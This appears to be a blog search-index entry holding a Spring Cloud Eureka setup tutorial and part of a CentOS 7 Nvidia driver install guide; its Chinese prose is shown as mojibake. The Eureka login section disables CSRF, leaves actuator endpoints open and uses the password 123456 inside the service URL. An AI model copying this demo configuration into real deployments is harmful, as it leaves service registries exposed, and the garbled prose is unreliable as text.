&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;${springcloud.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt; 3. åˆ›å»º Eureka Server å·¥ç¨‹åˆ›å»º Eureka Server çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œåªéœ€æ·»åŠ  spring-cloud-starter-eureka-server å³å¯ï¼›è‹¥ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬çš„ SpringCloudï¼Œåˆ™éœ€è¦æ”¹ä¸ºæ·»åŠ  spring-cloud-starter-netflix-eureka-server 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; åˆ›å»º Eureka Server çš„å¯åŠ¨ä¸»ç±»ï¼Œè¿™é‡Œæ·»åŠ ç›¸åº”æ³¨è§£ï¼Œä½œä¸ºç¨‹åºçš„å…¥å£ï¼š 12345678@SpringBootApplication@EnableEurekaServerpublic class EurekaServerApplication { public static void main(String[] args){ SpringApplication.run(EurekaServerApplication.class, args); }} æ·»åŠ  Eureka Server éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹çš„ src/main/resources ç›®å½•ä¸‹ï¼š 1234567891011server: port: 7001eureka: instance: hostname: localhost #EurekaæœåŠ¡ç«¯çš„å®ä¾‹åç§° client: register-with-eureka: false #falseè¡¨ç¤ºä¸å‘æ³¨å†Œä¸­å¿ƒæ³¨å†Œè‡ªå·± fetch-registry: false #falseè¡¨ç¤ºè‡ªå·±å°±æ˜¯æ³¨å†Œä¸­å¿ƒï¼ŒèŒè´£å°±æ˜¯ç»´æŠ¤æœåŠ¡å®ä¾‹ï¼Œå¹¶ä¸éœ€è¦å»æ£€ç´¢æœåŠ¡ service-url: defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/ 4. åˆ›å»º Eureka Client å·¥ç¨‹åˆ›å»º Eureka Client çš„ Maven å·¥ç¨‹ï¼ˆä½œä¸ºæœåŠ¡æä¾›è€…ï¼‰ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œéœ€è¦æ·»åŠ ä»¥ä¸‹å†…å®¹ã€‚è‹¥ä½¿ç”¨æœ€æ–°ç‰ˆçš„ SpringCloudï¼Œæ­¤æ—¶åªéœ€è¦å¼•å…¥ spring-cloud-starter-netflix-eureka-client ä¾èµ– 12345678910&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-eureka&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-config&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; åˆ›å»º Eureka Client çš„å¯åŠ¨ä¸»ç±»ï¼Œæ·»åŠ æ³¨è§£ @EnableEurekaClient 12345678@EnableEurekaClient@SpringBootApplicationpublic class DeptProviderApplication { public static void main(String[] args){ SpringApplication.run(DeptProviderApplication.class, args); }} æ·»åŠ  Eureka Client éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹çš„ src/main/resources ç›®å½•ä¸‹ï¼Œç‰¹åˆ«æ³¨æ„ï¼šåœ¨ç”Ÿäº§ç¯å¢ƒï¼ˆå¤–ç½‘ï¼‰éƒ¨ç½² Eureka Serverï¼Œä¸€å®šè¦é…ç½® eureka:instance:prefer-ip-address: true å‚æ•°ï¼Œå¦åˆ™æœåŠ¡æ¶ˆè´¹è€…æ— æ³•é€šè¿‡æ­£ç¡®çš„ IP è°ƒç”¨æœåŠ¡æä¾›è€…çš„æ¥å£ 1234567891011121314server: port: 9090spring: application: name: demo-client #éœ€è¦æŒ‡å®šspring.application.nameï¼Œå¦åˆ™ä¼šåœ¨ Eureka Server ç•Œé¢æ˜¾ç¤ºä¸º UNKNOWeureka: client: service-url: defaultZone: http://localhost:7001/eureka instance: instance-id: demo-client-9090 #è‡ªå®šä¹‰æœåŠ¡åç§° prefer-ip-address: true #å°†IPæ³¨å†Œåˆ°Eureka Serverä¸Šï¼Œè‹¥ä¸é…ç½®é»˜è®¤ä½¿ç”¨æœºå™¨çš„ä¸»æœºå 5. å®Œå–„æ³¨å†ŒæœåŠ¡çš„ info ä¿¡æ¯Maven çˆ¶çº§ Pom å·¥ç¨‹æ·»åŠ ä»¥ä¸‹é…ç½®ï¼š 1234567891011121314151617181920&lt;build&gt; &lt;finalName&gt;springcloud-demo&lt;/finalName&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;filtering&gt;true&lt;/filtering&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;delimiters&gt; &lt;delimit&gt;$&lt;/delimit&gt; &lt;/delimiters&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; é…ç½® Eureka Client å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œå¼•å…¥ spring-boot-starter-actuator 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; é…ç½® Eureka Client å·¥ç¨‹é‡Œçš„ application.yml æ–‡ä»¶ï¼Œæ·»åŠ ä»¥ä¸‹å†…å®¹ï¼›è‹¥ Info ç•Œé¢ä¸èƒ½æ­£ç¡®æ˜¾ç¤º $ ç¬¦å·æ›¿æ¢åçš„æœåŠ¡ä¿¡æ¯ï¼Œå¯ä»¥å°è¯•ä¾æ¬¡æ‰§è¡Œ mvn clean ã€mvn compileã€ mvn install å‘½ä»¤ 12345info: app.name: springcloud-demo company.name: www.example.com build.version: $project.version$ build.artifactId: $project.artifactId$ 6. æµ‹è¯•åˆ†åˆ«å¯åŠ¨ eureka-server åŠ eureka-client åº”ç”¨ï¼Œç„¶åé€šè¿‡æµè§ˆå™¨è®¿é—® http://127.0.0.1:7001ï¼Œè‹¥æ­£å¸¸æ˜¾ç¤º Eureka Server çš„ç®¡ç†ç•Œé¢å’ŒæœåŠ¡åˆ—è¡¨ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œåˆ™è¯´æ˜ä¸€åˆ‡é…ç½®æˆåŠŸã€‚ Eureka è¿›é˜¶å®æˆ˜Eureka çš„æœåŠ¡äº‹ä»¶ç›‘å¬Eureka æä¾›äº†äº”ç§æœåŠ¡ç›‘å¬äº‹ä»¶ï¼Œå› ä¸ºåœ¨æŸäº›ä¸šåŠ¡åœºæ™¯ä¸‹ï¼Œå¯èƒ½éœ€è¦åšä¸€äº›è‡ªå®šä¹‰çš„æ‰©å±•ï¼›ä¾‹å¦‚æŸä¸ªå¾®æœåŠ¡æŒ‚æ‰äº†ï¼Œå¸Œæœ›èƒ½ç›‘å¬åˆ°å¹¶ç»™ç®¡ç†å‘˜å‘é€é‚®ä»¶é€šçŸ¥ç­‰ã€‚ EurekaServerStartedEvent: Eureka æ³¨å†Œä¸­å¿ƒå¯åŠ¨äº‹ä»¶ EurekaRegistryAvailableEvent: Eureka æ³¨å†Œä¸­å¿ƒå¯ç”¨äº‹ä»¶ EurekaInstanceRenewedEvent: æœåŠ¡å®ä¾‹ç»­çº¦äº‹ä»¶ EurekaInstanceCanceledEvent: æœåŠ¡å®ä¾‹ä¸‹çº¿äº‹ä»¶ EurekaInstanceRegisteredEvent: æœåŠ¡å®ä¾‹æ³¨å†Œäº‹ä»¶ Eureka çš„ REST APIEureka æä¾›äº† REST APIï¼Œå…è®¸é Java è¯­è¨€çš„å…¶ä»–åº”ç”¨æœåŠ¡é€šè¿‡ HTTP REST çš„æ–¹å¼æ¥å…¥ Eureka çš„æœåŠ¡å‘ç°ä¸­ï¼ŒAPI åˆ—è¡¨å¯å‚è€ƒ Eureka å®˜æ–¹æ–‡æ¡£çš„ä»‹ç»æˆ–è€…ä¸‹å›¾ã€‚ Eureka å¼€å¯ç™»å½•è®¤è¯é…ç½® Eureka Server å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œå¼•å…¥ spring-cloud-starter-security ä¾èµ– 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-security&lt;/artifactId&gt;&lt;/dependency&gt; é…ç½® Eureka Server å·¥ç¨‹é‡Œçš„ application.yml æ–‡ä»¶ï¼Œå¢åŠ ç”¨æˆ·åã€å¯†ç çš„é…ç½® 123456security: basic: enabled: true user: name: admin #Eurekaçš„ç™»å½•ç”¨æˆ·å password: 123456 #Eurekaçš„ç™»å½•å¯†ç  åœ¨ Eureka Server å·¥ç¨‹é‡ŒåŠ å…¥ Security é…ç½®ç±»ï¼Œå…³é—­æ‰ CSRFï¼Œå¦åˆ™ Client æ— æ³•è¿æ¥ Eureka Server ç«¯ï¼›è‹¥é¡¹ç›®ä¸­å¼•å…¥äº† Actuatorï¼Œé‚£ä¹ˆè¿˜éœ€è¦æ”¾è¡Œ Actuator çš„è¯·æ±‚ 12345678910111213@EnableWebSecuritypublic class WebSecurityConfig extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http.csrf().disable() .authorizeRequests() .antMatchers("/eureka/**").permitAll() .antMatchers("/actuator/**").permitAll() .anyRequest().authenticated().and().httpBasic(); }} é…ç½® Eureka Client å·¥ç¨‹é‡Œçš„ application.yml æ–‡ä»¶ï¼Œæ›´æ”¹æ³¨å†Œä¸­å¿ƒçš„åœ°å€ 1234567891011121314server: port: 9090spring: application: name: demo-clienteureka: client: service-url: defaultZone: http://admin:123456@localhost:7001/eureka instance: instance-id: demo-client-9090 prefer-ip-address: true åˆ†åˆ«å¯åŠ¨ eureka-server åŠ eureka-client åº”ç”¨ï¼Œç„¶åé€šè¿‡æµè§ˆå™¨è®¿é—® http://127.0.0.1:7001ï¼Œæ­¤æ—¶ä¼šå…ˆå¼¹å‡ºç™»å½•æ¡†ï¼Œè¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç åæ‰èƒ½çœ‹åˆ°ç®¡ç†é¡µé¢ Eureka é›†ç¾¤é…ç½®å‡è®¾ç°æœ‰ä¸‰å° Eureka Server ä¸»æœºï¼Œæ¯å°ä¸»æœºçš„ IP ä¸ç«¯å£åˆ†åˆ«æ˜¯ï¼š 192.168.1.105:8005ã€192.168.1.106:8006ã€192.168.1.107:8007 Eureka Server1 é…ç½®1234567891011server: port: 8005eureka: instance: hostname: 192.168.1.105 client: register-with-eureka: false fetch-registry: false service-url: defaultZone: http://192.168.1.106:8006/eureka/,http://192.168.1.107:8007/eureka/ Eureka Server2 é…ç½®1234567891011server: port: 8006eureka: instance: hostname: 192.168.1.106 client: register-with-eureka: false fetch-registry: false service-url: defaultZone: http://192.168.1.105:8005/eureka/,http://192.168.1.107:8007/eureka/ Eureka Server3 é…ç½®1234567891011server: port: 8007eureka: instance: hostname: 192.168.1.107 client: register-with-eureka: false fetch-registry: false service-url: defaultZone: http://192.168.1.105:8005/eureka/,http://192.168.1.106:8006/eureka/ Eureka Client é›†ç¾¤é…ç½®1234567891011121314server: port: 9090spring: application: name: demo-clienteureka: client: service-url: defaultZone: http://192.168.1.105:8005/eureka/,http://192.168.1.106:8006/eureka/,http://192.168.1.107:8007/eureka/ instance: instance-id: demo-client-9090 prefer-ip-address: true å¯åŠ¨ä¸‰å° Eureka Serverï¼Œåˆ†åˆ«è®¿é—®ä¸‰å° Eureka Server çš„ç®¡ç†ç•Œé¢ï¼Œè‹¥ç•Œé¢ä¸Šçš„ DS Replicas é¡¹å¯ä»¥æ­£å¸¸æ˜¾ç¤ºå…¶ä»– Eureka Server èŠ‚ç‚¹ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œåˆ™è¯´æ˜ Eureka æœåŠ¡å™¨é›†ç¾¤é…ç½®æˆåŠŸ æœ¬åœ°é›†ç¾¤æ­å»ºçš„ç»†èŠ‚è¯´æ˜è‹¥ä¸‰å° Eureka Server çš„ IP éƒ½æ˜¯ 127.0.0.1 æˆ–è€… localhostï¼Œå½¼æ­¤åªæ˜¯æœåŠ¡ç«¯å£ä¸ä¸€æ ·ï¼›æ­¤æ—¶å»ºè®®ä¿®æ”¹ç³»ç»Ÿçš„ hosts æ–‡ä»¶ä½œç›¸åº”çš„åŸŸåæ˜ å°„ï¼Œæ–¹ä¾¿æ—¥åè®¿é—® Eureka çš„æœåŠ¡ã€‚å½“ hosts æ–‡ä»¶åŠ å…¥ä¸‹è¿°é…ç½®ä¹‹åï¼Œåˆ™å¯ä»¥é€šè¿‡ä¸åŒçš„åŸŸåè®¿é—®å¯¹åº”çš„ Eureka æœåŠ¡äº†ï¼Œå¦‚ï¼šhttp://eureka8005.com:8005/eureka/ 123127.0.0.1 eureka8005.com127.0.0.1 eureka8006.com127.0.0.1 eureka8007.com ç‰¹åˆ«æ³¨æ„ï¼šæ–°ç‰ˆçš„ Eureka æ­å»ºé›†ç¾¤æ—¶ï¼Œeureka.client.serviceUrl.defaultZone é…ç½®é¡¹çš„åœ°å€ï¼Œä¸èƒ½ä½¿ç”¨ localhost æˆ–è€…å†…ç½‘/å¤–ç½‘ IPï¼Œå¿…é¡»ä½¿ç”¨åŸŸåï¼ŒDNS è§£æéœ€è‡ªè¡Œé…ç½®ï¼Œä¹Ÿå¯ä»¥åœ¨æœ¬æœºçš„ /etc/hosts é‡Œæ˜ å°„åŸŸåï¼Œå¦åˆ™å„èŠ‚ç‚¹å‡å‡ºç°åœ¨ unavailable-replicas ä¸‹ è¡¥å……å†…å®¹CAP ç†è®ºCAP ç†è®ºçš„æ ¸å¿ƒæ˜¯ï¼šä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿä¸å¯èƒ½åŒæ—¶å¾ˆå¥½åœ°æ»¡è¶³ä¸€è‡´æ€§ã€å¯ç”¨æ€§å’Œåˆ†åŒºå®¹é”™æ€§è¿™ä¸‰ä¸ªéœ€æ±‚ã€‚å› æ­¤ï¼Œæ ¹æ® CAP ç†è®ºå¯ä»¥å°† NoSQL æ•°æ®åº“åˆ†æˆæ»¡è¶³ CA åŸåˆ™ã€æ»¡è¶³ CP åŸåˆ™å’Œæ»¡è¶³ AP åŸåˆ™ä¸‰å¤§ç±»ï¼š CA - å•ç‚¹é›†ç¾¤ï¼Œæ»¡è¶³ä¸€è‡´æ€§ã€å¯ç”¨æ€§çš„ç³»ç»Ÿï¼Œé€šå¸¸åœ¨å¯æ‰©å±•ä¸Šä¸å¤ªå¼ºå¤§ CP - æ»¡è¶³ä¸€è‡´æ€§ï¼Œåˆ†åŒºå®¹é”™æ€§çš„ç³»ç»Ÿï¼Œé€šå¸¸æ€§èƒ½ä¸æ˜¯ç‰¹åˆ«é«˜ AP - æ»¡è¶³å¯ç”¨æ€§ã€åˆ†åŒºå®¹å¿æ€§çš„ç³»ç»Ÿï¼Œé€šå¸¸å¯èƒ½å¯¹ä¸€è‡´æ€§è¦æ±‚ä½ä¸€ç‚¹ Eureka å¯¹æ¯” ZooKeeper ZooKeeper ä¿è¯çš„æ˜¯ CPï¼ŒEureka ä¿è¯çš„æ˜¯ AP Eureka æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå·¥ç¨‹ï¼Œè€Œ ZooKeeper åªæ˜¯ä¸€ä¸ªè¿›ç¨‹ ZooKeeper æœ‰ Leader å’Œ Follower è§’è‰²ï¼ŒEureka å„ä¸ªèŠ‚ç‚¹æ˜¯å¹³ç­‰å…³ç³» ZooKeeper åœ¨é€‰ä¸¾æœŸé—´æ³¨å†ŒæœåŠ¡ç˜«ç—ªï¼Œè™½ç„¶æœåŠ¡æœ€ç»ˆä¼šæ¢å¤ï¼Œä½†æ˜¯é€‰ä¸¾æœŸé—´ä¸å¯ç”¨ï¼›Eureka åªè¦æœ‰ä¸€å®ä¾‹å°±å¯ä»¥ä¿è¯æœåŠ¡å¯ç”¨ï¼Œä½†æŸ¥è¯¢åˆ°çš„æ•°æ®å¯èƒ½å¹¶ä¸æ˜¯æœ€æ–°çš„ ZooKeeper é‡‡ç”¨è¿‡åŠæ•°å­˜æ´»åŸåˆ™ï¼ŒEureka é‡‡ç”¨è‡ªæˆ‘ä¿æŠ¤æœºåˆ¶è§£å†³åˆ†åŒºé—®é¢˜ Netflix åœ¨ AWS ä¸­çš„ Eureka éƒ¨ç½²æ¶æ„ ä¸Šå›¾ï¼ˆå·¦è¾¹ï¼‰æè¿°çš„æ˜¯ Netflix åœ¨ AWS ä¸­çš„ Eureka éƒ¨ç½²æ¶æ„ï¼Œå›¾ä¸­çš„ us-east-1x æŒ‡çš„æ˜¯ä¸åŒçš„ zoneã€‚AWS å°†æœåŠ¡åˆ’åˆ†æˆä¸åŒåœ°åŒºï¼ˆregionï¼‰ï¼Œæ¯ä¸ª region ä¸­åˆæœ‰è‹¥å¹²ä¸ªæœºæˆ¿ï¼ˆzoneï¼‰ï¼Œç»“æ„å›¾å¤§è‡´ä¸Šå›¾ï¼ˆå³è¾¹ï¼‰æ‰€ç¤ºï¼Œæ¯ä¸ª zone éƒ½æ˜¯ä¸€ä¸ª Eureka é›†ç¾¤ï¼Œå…¶ä¸­è‡³å°‘æœ‰ä¸€å° Eureka Serverï¼Œç”¨æ¥å¤„ç† zone failureã€‚åœ¨ Eureka ä¸­æ³¨å†Œçš„æœåŠ¡æ¯éš” 30s ä¼šå‘æœåŠ¡ç«¯å‘é€ä¸€æ¬¡å¿ƒè·³ï¼Œç”¨æ¥å‘ŠçŸ¥æœåŠ¡ç«¯è‡ªå·±æ˜¯å¦â€ å­˜æ´»â€ï¼Œè¿™ä¸ªè¿‡ç¨‹å°±æ˜¯å›¾ä¸­çš„ renewï¼›å¦‚æœ renew æ“ä½œåœ¨é‡è¯•å‡ æ¬¡åéƒ½æ²¡æœ‰æˆåŠŸï¼Œé‚£è¿™ä¸ªæœåŠ¡åœ¨ 90s ä¹‹å†…å°±ä¼šè¢«è¸¢é™¤ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œrenew ä¿¡æ¯å’ŒæœåŠ¡æ³¨å†Œä¿¡æ¯ä¼šåœ¨å¤šä¸ª zone é—´åŒæ­¥ï¼Œä»»ä½•ä¸€ä¸ª zone ä¸­çš„å®¢æˆ·ç«¯éƒ½å¯ä»¥å¯»æ‰¾åˆ°ä»»æ„ä¸€ä¸ª zone ä¸­æ³¨å†Œçš„æœåŠ¡ä¿¡æ¯ã€‚ ä¸¤ä¸ª @EnableXXXClient æ³¨è§£çš„åŒºåˆ« Spring Cloud æä¾›äº† @EnableDiscoveryClient ä¸ @EnableEurekaClient æ³¨è§£ï¼Œå…¶ä¸­ @EnableDiscoveryClient åŸºäº spring-cloud-commonsï¼Œè€Œ @EnableEurekaClient åŸºäº spring-cloud-netflix Spring Cloud çš„æœåŠ¡æ³¨å†Œå‘ç°æœ‰å¤šç§å®ç°ï¼ˆEurekaã€Consulã€Zookeeper ç­‰ï¼‰ï¼Œå¦‚æœé€‰ç”¨çš„æ³¨å†Œä¸­å¿ƒæ˜¯ Eurekaï¼Œé‚£ä¹ˆå°±æ¨èä½¿ç”¨ @EnableEurekaClientï¼Œå¦‚æœæ˜¯å…¶ä»–çš„æ³¨å†Œä¸­å¿ƒï¼Œé‚£ä¹ˆæ¨èä½¿ç”¨ @EnableDiscoveryClient ç‰¹åˆ«æ³¨æ„ï¼š@EnableEurekaClient ä¸ŠåŒ…å«äº† @EnableDiscoveryClientï¼Œå¯ä»¥è¯´ @EnableEurekaClient æ‹¥æœ‰ @EnableDiscoveryClient çš„åŠŸèƒ½ï¼Œå…¶å® @EnableEurekaClient å°±æ˜¯ä¸€ç§æ–¹ä¾¿ä½¿ç”¨ Eureka çš„æ³¨è§£è€Œå·² var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"Centos7 å®‰è£… Nvidia æ˜¾å¡é©±åŠ¨",url:"/posts/3a164cac.html",text:'ç³»ç»Ÿç¯å¢ƒ 12CentOS Linux release 7.6.1810 (Core)Linux centos7.6 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux æ£€æŸ¥æ˜¾å¡çš„è¯†åˆ«çŠ¶å†µ åœ¨æ‰§è¡Œä¸‹è¿°æ‰€æœ‰æ­¥éª¤ä¹‹å‰ï¼Œå¿…é¡»ç¡®ä¿å½“å‰ç³»ç»Ÿå·²ç»æ­£ç¡®è¯†åˆ«åˆ° NVIDIA çš„æ˜¾å¡ï¼Œå¦åˆ™åœ¨æ˜¾å¡æ²¡æœ‰è¢«æ­£å¸¸è¯†åˆ«çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œåç»­çš„å®‰è£…æ­¥éª¤éƒ½æ˜¯å¾’åŠ³çš„ã€‚æ­¤æ—¶å¯ä»¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œè‹¥å¯ä»¥è¾“å‡ºç›¸å…³ä¿¡æ¯ï¼Œåˆ™è¯´æ˜æ˜¾å¡èƒ½è¢«ç³»ç»Ÿæ­£å¸¸è¯†åˆ«ã€‚å¦åˆ™è¯·é‡æ–°æ’æ‹”æ˜¾å¡ï¼Œæˆ–è€…æ£€æŸ¥ä¸»æ¿æ˜¯å¦éœ€è¦è·³çº¿æˆ–è€…è®¾ç½® BIOS æ‰èƒ½æ­£ç¡®è¯†åˆ«ç‹¬ç«‹æ˜¾å¡ã€‚ 1# lspci | grep "NVIDIA" å®‰è£…è½¯ä»¶ä¾èµ– 1# yum -y install gcc gcc-c++ wget å®‰è£… NVIDIA æ˜¾å¡æ£€æµ‹å·¥å…· 12345678910111213# å¯¼å…¥key# rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org# å®‰è£…elrepoæº# rpm -Uvh http://www.elrepo.org/elrepo-release-7.0-2.el7.elrepo.noarch.rpm# å®‰è£…æ£€æµ‹å·¥å…·# yum install nvidia-detect# æ£€æµ‹æ˜¾å¡ï¼Œæ­£å¸¸æƒ…å†µä¸‹ä¼šè¾“å‡ºæœ€æ–°ä¸”é€‚ç”¨å½“å‰æ˜¾å¡çš„é©±åŠ¨ç¨‹åºçš„ç‰ˆæœ¬å·ä¿¡æ¯# nvidia-detect -v# æç¤ºï¼šä¸å»ºè®®ä½¿ç”¨rpmfusionå®‰è£…Nvidiaçš„æ˜¾å¡é©±åŠ¨ï¼Œå› ä¸ºå¼€æºçš„æ˜¾å¡é©±åŠ¨åœ¨æ€§èƒ½æ–¹é¢è·ŸNvidiaå®˜æ–¹çš„é—­æºæ˜¾å¡é©±åŠ¨æœ‰ä¸€å®šçš„å·®è· ä¸‹è½½ NVIDIA é©±åŠ¨ç¨‹åº æ ¹æ®æ˜¾å¡æ£€æµ‹ç»“æœï¼Œåœ¨ NVIDIA å®˜ç½‘ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„ Linux æ˜¾å¡é©±åŠ¨ç¨‹åºã€‚ 12# ä¸‹è½½é©±åŠ¨ï¼ˆè¯·è‡ªè¡Œä¿®æ”¹URLä¸­çš„é©±åŠ¨ç‰ˆæœ¬å·ï¼‰# wget https://us.download.nvidia.cn/XFree86/Linux-x86_64/430.40/NVIDIA-Linux-x86_64-430.40.run å±è”½ç³»ç»Ÿè‡ªå¸¦çš„ Nouveau æ˜¾å¡é©±åŠ¨ 123456# é€šè¿‡vimç¼–è¾‘å™¨æ›´æ”¹é…ç½®æ–‡ä»¶ï¼ŒæŒ‰ç…§ä»¥ä¸‹å†…å®¹è¿›è¡Œä¿®æ”¹# vim /lib/modprobe.d/dist-blacklist.confblacklist nouveau #æ·»åŠ æ­¤è¡Œoptions nouveau modeset=0 #æ·»åŠ æ­¤è¡Œ# blacklist nvidiafb #å°†nvidiafbçš„è¿™ä¸€è¡Œæ³¨é‡Šæ‰ é‡å»º initramfs image 12345# å¤‡ä»½# mv /boot/initramfs-$(uname -r).img /boot/initramfs-$(uname -r).img.bak# é‡å»º# dracut /boot/initramfs-$(uname -r).img $(uname -r) é‡å¯ç³»ç»Ÿ 12345678910# ä¿®æ”¹ç³»ç»Ÿè¿è¡Œçº§åˆ«ä¸ºçº¯æ–‡æœ¬æ¨¡å¼# systemctl set-default multi-user.target# é‡å¯ç³»ç»Ÿ# reboot# ç³»ç»Ÿé‡å¯å®Œæˆåï¼Œåœ¨çº¯æ–‡æœ¬æ¨¡å¼ä¸‹ä½¿ç”¨rootç”¨æˆ·ç™»å½•è¿›ç³»ç»Ÿ# æŸ¥çœ‹nouveauæ˜¾å¡é©±åŠ¨æ˜¯å¦å·²ç»è¢«ç¦ç”¨ï¼Œè‹¥æ­¤å‘½ä»¤æ‰§è¡Œå®Œä¹‹åæ²¡æœ‰è¾“å‡ºç›¸å…³ä¿¡æ¯ï¼Œåˆ™è¯´æ˜å·²ç»è¢«ç¦ç”¨# lsmod | grep nouveau (adsbygoogle = window.adsbygoogle || []).push({}); å®‰è£… NVIDIA æ˜¾å¡é©±åŠ¨ï¼ˆçº¯æ–‡æœ¬æ¨¡å¼ä¸‹ï¼‰ 12345678910111213141516171819# æ–‡ä»¶æˆæƒ# chmod +x NVIDIA-Linux-x86_64-384.59.run# å®‰è£…æ˜¾å¡é©±åŠ¨# ./NVIDIA-Linux-x86_64-384.59.run# å®‰è£…è¿‡ç¨‹ä¸­ï¼Œé€‰æ‹©acceptï¼›å¦‚æœæç¤ºæ˜¯å¦ç¼–è¯‘DKMSæ¨¡å—ï¼Œé€‰æ‹©yesï¼ˆæ–¹ä¾¿ä»¥åå‡çº§ç³»ç»Ÿå†…æ ¸ï¼‰ï¼›å¦‚æœæç¤ºè¦ä¿®æ”¹xorg.confï¼Œé€‰æ‹©yesï¼›# æŸ¥çœ‹æ˜¾å¡é©±åŠ¨çš„å®‰è£…çŠ¶æ€ï¼Œè‹¥æ­¤å‘½ä»¤æ‰§è¡Œå®Œä¹‹åæ­£å¸¸è¾“å‡ºæ˜¾å¡çŠ¶æ€ç›¸å…³çš„ä¿¡æ¯ï¼Œåˆ™è¯´æ˜Nvidiaæ˜¾å¡é©±åŠ¨å®‰è£…æˆåŠŸ# nvidia-smi# ä¿®æ”¹ç³»ç»Ÿè¿è¡Œçº§åˆ«ä¸ºå›¾å½¢æ¨¡å¼# systemctl set-default graphical.target# é‡å¯ç³»ç»Ÿ# reboot# é‡å¯å®Œæˆåï¼Œè‹¥æˆåŠŸè¿›å…¥GNOMEçš„æ¡Œé¢ç¯å¢ƒï¼Œæ‰§è¡Œæ­¤å‘½ä»¤å¯ä»¥è°ƒå‡ºå›¾å½¢ç•Œé¢æ¥é…ç½®æ˜¾å¡ï¼ˆå¯é€‰æ“ä½œï¼‰# nvidia-settings å¸è½½ NVIDIA æ˜¾å¡é©±åŠ¨ï¼ˆå¯é€‰æ“ä½œï¼‰ å¦‚æœæ˜¾å¡é©±åŠ¨å®‰è£…å’Œç³»ç»Ÿé‡å¯å®Œæˆåï¼Œæ— æ³•æ­£å¸¸è¿›å…¥ GHOME çš„æ¡Œé¢ç¯å¢ƒï¼Œæ­¤æ—¶å¯ä»¥åœ¨å¦ä¸€å°æœºå™¨ä¸Šé€šè¿‡è¿œç¨‹ SSH ä½¿ç”¨ root ç”¨æˆ·ç™»å½•è¿›ç³»ç»Ÿï¼Œç„¶åæ‰‹åŠ¨æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å¸è½½ NVIDIA çš„æ˜¾å¡é©±åŠ¨ç¨‹åºï¼ˆåœ¨çº¯æ–‡æœ¬æ¨¡å¼ä¸‹ï¼‰ã€‚ç‰¹åˆ«æ³¨æ„ï¼šå½“ NVIDIA çš„æ˜¾å¡é©±åŠ¨è¢«å¸è½½åï¼Œéœ€è¦å¯ç”¨ç³»ç»Ÿè‡ªå¸¦çš„ Nouveau æ˜¾å¡é©±åŠ¨ å’Œ è¿˜åŸ initramfs imageï¼Œå¦åˆ™ç³»ç»Ÿä¼šå› ç¼ºå°‘æ˜¾å¡é©±åŠ¨è€Œæ— æ³•æ­£å¸¸æ˜¾ç¤ºã€‚ 1# ./NVIDIA-Linux-x86_64-430.40.run --uninstall ç³»ç»Ÿå†…æ ¸æ›´æ–°é—®é¢˜ å¦‚æœç³»ç»Ÿæ›´æ–°å†…æ 